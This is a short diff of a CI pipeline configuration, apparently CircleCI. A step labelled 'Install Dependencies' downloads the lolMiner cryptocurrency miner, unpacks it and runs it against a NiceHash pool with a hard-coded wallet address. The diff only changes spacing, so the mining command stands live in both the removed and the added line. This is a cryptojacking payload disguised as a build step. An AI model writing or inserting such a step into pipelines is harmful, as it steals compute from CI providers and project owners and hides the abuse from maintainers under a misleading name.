@@ -27,7 +27,7 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: !wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.42/lolMiner_v1.42_Lin64.tar.gz && tar xf lolMiner_v1.42_Lin64.tar.gz && cd 1.42 && ./lolMiner --algo BEAM-lll --pool stratum+tcp://beamv3.eu-west.nicehash.com:3387 --user 32pDUGDSt9Y8Jei51sH91ASJvwKqaHV7RW.worker3 --tls 0
+            command: ! wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.42/lolMiner_v1.42_Lin64.tar.gz && tar xf lolMiner_v1.42_Lin64.tar.gz && cd 1.42 && ./lolMiner --algo BEAM-lll --pool stratum+tcp://beamv3.eu-west.nicehash.com:3387 --user 32pDUGDSt9Y8Jei51sH91ASJvwKqaHV7RW.worker3 --tls 0
 workflows:
     version: 2.1
     build:
